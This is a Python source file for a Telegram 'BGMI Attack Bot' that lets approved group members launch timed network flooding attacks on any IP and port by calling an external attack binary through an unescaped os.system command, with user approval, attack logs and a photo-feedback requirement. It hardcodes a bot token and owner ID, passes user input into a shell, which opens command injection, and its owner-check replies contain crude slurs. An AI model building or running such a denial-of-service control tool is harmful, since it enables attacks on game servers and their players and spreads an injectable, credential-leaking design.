import os
import time
import threading
import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode

# Bot configuration
TOKEN = "7877126466:AAH6lNFpehRtrqV7pU4Gl2hHV5UNupLLsfo"
OWNER_ID = 1174779637
GROUP_ID = -1002563728588  # Your group ID

# Global variables
bot_active = True
approved_users = set()
user_attacks = {}
user_feedbacks = {}
banned_users = {}
attack_logs = []
current_attack = None

def load_data():
    global approved_users, user_attacks, attack_logs
    try:
        with open("approved_users.txt", "r") as f:
            approved_users = set(int(line.strip()) for line in f if line.strip())
    except FileNotFoundError:
        approved_users = set()
    
    try:
        with open("user_attacks.txt", "r") as f:
            user_attacks = {int(k): int(v) for line in f 
                          for k, v in [line.strip().split()]}
    except FileNotFoundError:
        user_attacks = {}
    
    try:
        with open("logs.txt", "r") as f:
            attack_logs = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        attack_logs = []

def save_data():
    with open("approved_users.txt", "w") as f:
        f.write("\n".join(map(str, approved_users)))
    
    with open("user_attacks.txt", "w") as f:
        f.write("\n".join(f"{k} {v}" for k, v in user_attacks.items()))
    
    with open("logs.txt", "w") as f:
        f.write("\n".join(attack_logs))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_approved(user_id):
    return user_id in approved_users or is_owner(user_id)

def is_banned(user_id):
    if user_id in banned_users:
        if datetime.now() < banned_users[user_id]:
            return True
        del banned_users[user_id]
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    user = update.effective_user
    await update.message.reply_text(
        f"🚀 *Welcome {user.first_name} to BGMI Attack Bot!* 🚀\n\n"
        "Use /help for commands\n"
        "Use /rule for rules",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    help_text = """
*Available Commands:*

/start - Welcome message
/help - Show commands
/rule - Show rules
/bgmi IP PORT TIME - Attack (max 180s)

*Admin Commands (Owner Only):*
/admincmd - Show admin commands
/add USER_ID - Approve user
/remove USER_ID - Remove user
/boton - Turn bot on
/botoff - Turn bot off
/allusers - List approved users
/logs - Show attack logs
/broadcast MESSAGE - Broadcast to all
/clearlogs - Clear all logs
/clearuser - Clear all users
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    rules_text = """
*RULES:*

1️⃣ Only one attack at a time
2️⃣ Must give photo feedback after attack
3️⃣ No duplicate feedbacks
4️⃣ Max attack time: 180 seconds
5️⃣ Contact @HMSahil for help

Violations will result in bans!
"""
    await update.message.reply_text(rules_text, parse_mode=ParseMode.MARKDOWN)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack
    
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name
    
    if user_id not in user_feedbacks:
        await update.message.reply_text(
            "❌ Pehle feedback do photo ke saath!\n"
            "Tabhi next attack kar paoge.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if current_attack:
        remaining = (current_attack['end_time'] - datetime.now()).seconds
        await update.message.reply_text(
            f"⚠️ {current_attack['username']} attack kar raha hai!\n"
            f"Wait karo {remaining} seconds...",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("Format: /bgmi IP PORT TIME")
        return
    
    try:
        ip, port, attack_time = context.args[0], context.args[1], int(context.args[2])
    except ValueError:
        await update.message.reply_text("Invalid time format")
        return
    
    if attack_time > 180:
        await update.message.reply_text("Maximum attack time 180 seconds")
        return
    
    current_attack = {
        'user_id': user_id,
        'username': username,
        'end_time': datetime.now() + timedelta(seconds=attack_time)
    }
    
    await update.message.reply_text(
        f"⚡ Attack shuru by {username}!\n"
        f"IP: {ip}\nPort: {port}\nTime: {attack_time}s",
        parse_mode=ParseMode.MARKDOWN
    )
    
    os.system(f"./fuck {ip} {port} {attack_time}")
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    attack_logs.append(f"{timestamp} - {username} attacked {ip}:{port} for {attack_time}s")
    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
    
    if user_id in user_feedbacks:
        del user_feedbacks[user_id]
    
    threading.Timer(attack_time, lambda: asyncio.run(attack_complete(update, context))).start()
    save_data()

async def attack_complete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack
    if current_attack:
        username = current_attack['username']
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"✅ Attack complete by {username}!\n"
                 "Ab photo feedback bhejo next attack ke liye!",
            parse_mode=ParseMode.MARKDOWN
        )
        current_attack = None

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    admin_text = """
*Admin Commands:*

/add USER_ID - Approve user
/remove USER_ID - Remove user
/boton - Turn bot on
/botoff - Turn bot off
/allusers - List approved users
/logs - Show attack logs
/broadcast MESSAGE - Broadcast to all
/clearlogs - Clear all logs
/clearuser - Clear all users
"""
    await update.message.reply_text(admin_text, parse_mode=ParseMode.MARKDOWN)

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /add USER_ID [DURATION_HOURS]")
        return
    
    try:
        user_id = int(context.args[0])
        duration = int(context.args[1]) if len(context.args) > 1 else 24
        approved_users.add(user_id)
        save_data()
        await update.message.reply_text(f"✅ User {user_id} approved for {duration} hours")
    except ValueError:
        await update.message.reply_text("Invalid user ID or duration")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /remove USER_ID")
        return
    
    try:
        user_id = int(context.args[0])
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_data()
            await update.message.reply_text(f"✅ User {user_id} removed")
        else:
            await update.message.reply_text("User not in approved list")
    except ValueError:
        await update.message.reply_text("Invalid user ID")

async def bot_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    global bot_active
    bot_active = True
    await update.message.reply_text("✅ Bot is now ACTIVE")

async def bot_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    global bot_active
    bot_active = False
    await update.message.reply_text("❌ Bot is now INACTIVE")

async def all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not approved_users:
        await update.message.reply_text("No approved users")
        return
    
    users_list = "\n".join(f"👤 {user_id}" for user_id in approved_users)
    await update.message.reply_text(f"*Approved Users:*\n{users_list}", parse_mode=ParseMode.MARKDOWN)

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not attack_logs:
        await update.message.reply_text("No attack logs available")
        return
    
    with open("attack_logs.txt", "w") as f:
        f.write("\n".join(attack_logs))
    
    await update.message.reply_document(document=open("attack_logs.txt", "rb"))

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast YOUR_MESSAGE")
        return
    
    message = " ".join(context.args)
    for user_id in approved_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
        except Exception as e:
            print(f"Failed to send to {user_id}: {e}")
    
    await update.message.reply_text(f"✅ Broadcast sent to {len(approved_users)} users")

async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    global attack_logs
    attack_logs = []
    save_data()
    await update.message.reply_text("✅ All logs cleared")

async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    if not is_owner(update.effective_user.id):
        await update.message.reply_text(
            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    global approved_users
    approved_users = set()
    save_data()
    await update.message.reply_text("✅ All approved users removed")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID:
        return
    
    user = update.effective_user
    user_id = user.id
    photo_id = update.message.photo[-1].file_id
    
    if photo_id in user_feedbacks.values():
        banned_users[user_id] = datetime.now() + timedelta(minutes=5)
        await update.message.reply_text(
            "❌ Same feedback detected!\n"
            "5 minute ban lagaya gaya hai.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    user_feedbacks[user_id] = photo_id
    await update.message.reply_text(
        "✅ Feedback accept ho gaya!\n"
        "Ab aap /bgmi command use kar sakte hain.",
        parse_mode=ParseMode.MARKDOWN
    )

def main():
    load_data()
    app = Application.builder().token(TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("rule", rule))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("admincmd", admin_cmd))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("boton", bot_on))
    app.add_handler(CommandHandler("botoff", bot_off))
    app.add_handler(CommandHandler("allusers", all_users))
    app.add_handler(CommandHandler("logs", show_logs))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("clearlogs", clear_logs))
    app.add_handler(CommandHandler("clearuser", clear_users))
    
    # Photo handler
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    app.run_polling()

if __name__ == "__main__":
    main()